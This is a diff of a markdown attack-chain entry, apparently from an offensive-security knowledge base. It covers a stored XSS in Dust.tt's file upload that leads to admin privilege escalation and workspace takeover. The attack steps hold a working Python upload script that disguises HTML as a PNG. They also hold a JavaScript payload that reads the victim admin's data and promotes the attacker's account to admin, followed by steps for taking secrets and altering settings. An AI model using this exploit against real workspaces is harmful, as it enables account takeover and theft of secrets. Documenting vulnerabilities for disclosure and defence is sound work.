@@ -1,55 +1,55 @@
 ---
+id: de2b9ab1-62b0-40c6-b9f2-430e628aee9b
+name: >-
+  Stored XSS in File Upload Leading to Privilege Escalation and Workspace
+  Takeover
+type: attack_chain
+description: >-
+  A multi-stage attack exploiting a stored XSS vulnerability in Dust's file
+  upload to upload malicious HTML, trigger JavaScript execution in victims'
+  sessions, and escalate privileges for full workspace control.
+verified: false
+submitted: true
+step_count: 5
+created_at: '2023-10-01T00:00:00Z'
+updated_at: '2025-12-14T17:30:47.227Z'
+procedures:
+  - '[[procedures/Setup-Workspace-and-Accounts-for-Testing]]'
+  - '[[procedures/Upload-Malicious-HTML-File-via-API]]'
+  - '[[procedures/Share-Malicious-File-URL-with-Victim]]'
+  - '[[procedures/Trigger-XSS-for-Privilege-Escalation]]'
+techniques:
+  - '[[JavaScript]]'
+  - '[[Drive-by Compromise]]'
+tactics:
+  - '[[Initial Access]]'
+  - '[[Privilege Escalation]]'
 tags:
   - xss
   - stored-xss
-  - file-upload
   - privilege-escalation
-  - workspace-takeover
-type: attack_chain
-tools:
-  - '[[tools/Python]]'
-  - '[[tools/requests]]'
-  - '[[tools/requests_toolbelt]]'
-  - '[[tools/Web-Browser]]'
-tactics:
-  - '[[Initial Access]]'
-  - '[[Execution]]'
-  - '[[Privilege Escalation]]'
-verified: false
+  - file-upload
+  - javascript
 platforms:
   - Web
-submitted: true
-created_at: '2023-10-01T00:00:00Z'
-procedures:
-  - '[[procedures/Set-Up-Test-Workspace-and-Accounts]]'
-  - '[[procedures/Upload-Malicious-HTML-File-via-API]]'
-  - '[[procedures/Share-Malicious-URL-with-Admin]]'
-  - '[[procedures/Trigger-XSS-for-Privilege-Escalation]]'
-step_count: 5
-techniques:
-  - '[[Exploit Public-Facing Application]]'
-  - '[[JavaScript]]'
-updated_at: '2025-12-13T23:56:03.308Z'
-description: >-
-  A multi-stage attack exploiting a stored XSS vulnerability in Dust's file
-  upload API to upload malicious HTML disguised as images, share the URL, and
-  execute JavaScript in an admin's browser to escalate privileges and takeover
-  the workspace.
-id: cbc17575-2a39-4b82-8f94-4eee84fd96f6
+tools:
+  - '[[tools/requests]]'
+  - '[[tools/requests-toolbelt]]'
+complexity: medium
+skill_level: intermediate
+impact_level: high
 validated: true
 mitre_tactics:
   - '[[Initial Access]]'
-  - '[[Execution]]'
   - '[[Privilege Escalation]]'
 mitre_techniques:
-  - '[[Exploit Public-Facing Application]]'
   - '[[JavaScript]]'
----
+  - '[[Drive-by Compromise]]'
 ---
 
 # Stored XSS in File Upload Leading to Privilege Escalation and Workspace Takeover
 
-Multi-stage attack chain demonstrating exploitation of a stored XSS vulnerability in Dust's file upload functionality to achieve privilege escalation and full workspace control.
+Multi-stage attack chain demonstrating a complete attack workflow exploiting stored XSS in Dust's file upload to achieve arbitrary JavaScript execution, impersonation, and full workspace takeover.
 
 ## Chain Metrics Dashboard
 
@@ -66,15 +66,15 @@ Multi-stage attack chain demonstrating exploitation of a stored XSS vulnerabilit
 
 ```mermaid
 graph LR
-    A[Setup Workspace and Accounts] --> B[Upload Malicious File]
-    B --> C[Share URL with Admin]
-    C --> D[Admin Visits Link]
+    A[Setup Workspace and Accounts] --> B[Upload Malicious HTML File]
+    B --> C[Share File URL with Victim]
+    C --> D[Trigger XSS Execution]
     D --> E[Privilege Escalation and Takeover]
 
     style A fill:#e74c3c
     style B fill:#f39c12
-    style C fill:#f39c12
-    style D fill:#3498db
+    style C fill:#3498db
+    style D fill:#9b59b6
     style E fill:#27ae60
 ```
 
@@ -82,130 +82,129 @@ graph LR
 
 ### Required Tools
 
-- [[tools/Python]]
 - [[tools/requests]]
-- [[tools/requests_toolbelt]]
-- [[tools/Web-Browser]]
+- [[tools/requests-toolbelt]]
 
 ### Target Environment
 
-- Dust.tt platform (web-based AI workspace)
-- Access to Dust API endpoints
-- Valid session cookies for member account
+- Dust platform (web-based workspaces, conversations, assistants)
+- Required services: Dust API endpoints (e.g., https://dust.tt/api/w/<workspace_sid>/files)
+- Network access: Internet access to Dust.tt with authenticated sessions
 
 ### Initial Access Requirements
 
-- Administrative access to create or use a workspace
-- Ability to invite member accounts
-- Network access to https://dust.tt
+- Attacker account with member access to a Dust workspace
+- Victim account with admin privileges
+- Dummy/low-privilege account for simulation
+- Malicious HTML file containing JavaScript payload (e.g., xss.html with fetch calls for escalation)
 
 ## Detailed Attack Procedures
 
-### Step 1: Set Up Test Workspace and Accounts
-procedure: [[procedures/Set-Up-Test-Workspace-and-Accounts]]
+### Step 1: Setup Workspace and Accounts
+procedure: [[procedures/Setup-Workspace-and-Accounts-for-Testing]]
 
-**Objective**: Prepare the environment by creating a workspace and inviting a dummy member account to simulate the attacker.
+**Objective**: Prepare the testing environment by creating or accessing a workspace and adding accounts to simulate attacker and victim roles.
 
-**Instructions**: Log in as admin to create or select an existing workspace on dust.tt. Then invite a secondary account as a regular member.
+**Instructions**: Create a new workspace or use an existing one where the attacker has admin privileges. Then, invite a dummy account with normal member role to represent the low-privilege attacker.
 
-**Expected Output**: Workspace SID available and dummy account invited with member role.
+**Expected Output**: Workspace SID available; dummy account added as member.
 
 **Success Indicators**:
-- Workspace created or accessed with admin privileges
-- Dummy account confirmed as member
+- Workspace created/accessed successfully
+- Dummy account invited and joined
 
-### Step 2: Upload Malicious HTML File via API
+### Step 2: Upload Malicious HTML File
 procedure: [[procedures/Upload-Malicious-HTML-File-via-API]]
 
-**Objective**: Use the dummy account to upload a malicious HTML file disguised as a PNG image via the file upload API, exploiting lack of MIME-type validation.
+**Objective**: Use the dummy account to upload a malicious HTML file disguised as an image via the file upload API, bypassing content validation.
 
-**Instructions**: Prepare a Python script with the malicious HTML file (xss.html containing JS payload). Execute the upload using [[commands/initiate-file-upload-metadata]] to get presigned URL, then [[commands/upload-file-multipart]] to send the file with text/html content-type but .png filename.
+**Instructions**: Authenticate as the dummy account and use [[commands/request-upload-url]] to initiate the upload, followed by [[commands/upload-html-file-multipart]] to send the file content. The file is named 'xss_poc.png' but has contentType 'text/html' and contains JavaScript for later execution.
 
 ```python
-import requests
-from requests_toolbelt.multipart.encoder import MultipartEncoder
-cookies = {'appSession': '<dummy_account_session>'}
-json_data = {'contentType': 'text/html', 'fileName': 'xss_poc.png', 'fileSize': 7331, 'useCase': 'conversation'}
+# Example using requests (full script in procedure)
 response = requests.post('https://dust.tt/api/w/<workspace_sid>/files', cookies=cookies, json=json_data)
-print(response.text)
-uploadUrl = response.json()['file']['uploadUrl']
-
-cookies = {'appSession': '<dummy_account_session>'}
-m = MultipartEncoder(fields={'file': ('xss_poc.png', open('Dust/xss.html', 'rb'), 'text/html')})
-headers = {'accept': '*/*', 'accept-language': 'nb-NO,nb;q=0.9,no;q=0.8,nn;q=0.7,en-US;q=0.6,en;q=0.5', 'cache-control': 'no-cache', 'content-type': m.content_type, 'origin': 'https://dust.tt', 'pragma': 'no-cache', 'priority': 'u=1, i', 'referer': 'https://dust.tt/w/<workspace_sid>/assistant/new', 'sec-ch-ua': '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"macOS"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36'}
-response = requests.post(url=uploadUrl, headers=headers, cookies=cookies, data=m)
-print(f'[*] URL TO SHARE:\n{response.json()["file"]["downloadUrl"]}?action=view')
+upload_url = response.json()['file']['uploadUrl']
+requests.post(upload_url, headers=headers, cookies=cookies, data=m)
 ```
 
-**Expected Output**: JSON response with downloadUrl for the uploaded file.
+**Expected Output**: JSON response with 'downloadUrl' for the uploaded file.
 
 **Success Indicators**:
-- Upload successful without errors
-- Download URL generated
+- Upload URL obtained
+- File uploaded successfully without rejection
+- downloadUrl returned
 
-### Step 3: Share Malicious URL with Admin
-procedure: [[procedures/Share-Malicious-URL-with-Admin]]
+### Step 3: Share Malicious File URL
+procedure: [[procedures/Share-Malicious-File-URL-with-Victim]]
 
-**Objective**: Distribute the malicious file URL to the admin account to lure them into visiting it.
+**Objective**: Distribute the malicious file's view URL to the victim (admin) to lure them into opening it.
 
-**Instructions**: Copy the downloadUrl from the upload response and send it via chat, email, or workspace sharing to the admin.
+**Instructions**: Extract the 'downloadUrl?action=view' from the upload response and share it via workspace conversation, email, or direct message to the admin account.
 
-**Expected Output**: Admin receives and potentially visits the URL.
+**Expected Output**: Victim receives and clicks the URL.
 
 **Success Indicators**:
 - URL shared successfully
-- Admin confirms receipt or interaction
+- Victim accesses the file view endpoint
 
-### Step 4: Admin Visits Link and Triggers XSS
+### Step 4: Trigger XSS Execution
 procedure: [[procedures/Trigger-XSS-for-Privilege-Escalation]]
 
-**Objective**: When the admin views the file, the embedded JavaScript executes in their browser, fetching user data and promoting the attacker to admin.
+**Objective**: When the victim views the file, execute the embedded JavaScript to fetch user data and escalate the dummy account's privileges.
 
-**Instructions**: Admin opens the URL in their web browser. The JS automatically runs: first [[commands/fetch-user-data-js]] to get workspace and attacker IDs, then [[commands/promote-to-admin-js]] to escalate privileges.
+**Instructions**: The malicious HTML renders in the browser, running [[commands/fetch-user-data-javascript]] to get workspaceId and user details, then [[commands/promote-user-role-fetch]] to POST role change for the attacker.
 
 ```javascript
-fetch('https://dust.tt/api/user',{method:'GET',headers:{'accept':'*/*','x-commit-hash':'41c0391'},credentials:'include'}).then(r=>r.json()).then(user=>{const workspaceId=user.workspaces[0].sId;const attackerUserId='<attacker_id>';fetch(`https://dust.tt/api/w/${workspaceId}/members/${attackerUserId}`,{method:'POST',headers:{'content-type':'application/json','accept':'*/*','x-commit-hash':'41c0391'},credentials:'include',body:JSON.stringify({role:"admin"})})});
+// Embedded in HTML (full payload in procedure)
+fetch('https://dust.tt/api/user', {method: 'GET', credentials: 'include'}).then(r => r.json()).then(user => {
+  const workspaceId = user.workspaces[0].sId;
+  fetch(`https://dust.tt/api/w/${workspaceId}/members/${attackerUserId}`, {
+    method: 'POST',
+    body: JSON.stringify({role: 'admin'}),
+    credentials: 'include'
+  });
+});
 ```
 
-**Expected Output**: Attacker account promoted to admin role.
+**Expected Output**: Successful role update; dummy account promoted to admin.
 
 **Success Indicators**:
-- JS executes without errors
-- API calls succeed, privileges escalated
-- Workspace admin access confirmed for attacker
+- JavaScript executes in victim's session
+- Attacker account role changed to admin
+- Access to secrets and settings granted
 
-### Step 5: Validate Takeover
+### Step 5: Achieve Full Takeover
 
-**Objective**: Confirm full control over the workspace post-escalation.
+**Objective**: With elevated privileges, access secrets, modify settings, and control the workspace.
 
-**Instructions**: Log in as the escalated account and access admin-only features, such as managing members or sensitive data.
+**Instructions**: Use the new admin session to query secrets, delete data, or alter configurations via Dust API.
 
-**Expected Output**: Full admin dashboard access.
+**Expected Output**: Full access to workspace resources.
 
 **Success Indicators**:
-- Ability to modify workspace settings
-- Access to all files and conversations
+- Secrets retrieved
+- Workspace settings modified
+- Complete control verified
 
 ## Attack Chain Summary
 
 ### Key Achievements
 
-1. Successful upload of executable HTML via file API
-2. Triggering of stored XSS in admin's browser session
+1. Successful upload of unsanitized HTML file mimicking an image
+2. Arbitrary JavaScript execution in admin's authenticated session
 3. Privilege escalation from member to admin
-4. Complete workspace takeover enabling data access and control
+4. Full workspace takeover including secret access and data manipulation
 
 ## Technique & Tactic Coverage
 
 ### MITRE ATT&CK Techniques
 
-- [[Exploit Public-Facing Application]] Exploit Public-Facing Application
 - [[JavaScript]] JavaScript
+- [[Drive-by Compromise]] Drive-by Compromise
 
 ### MITRE ATT&CK Tactics
 
 - [[Initial Access]] Initial Access
-- [[Execution]] Execution
 - [[Privilege Escalation]] Privilege Escalation
 
 ---
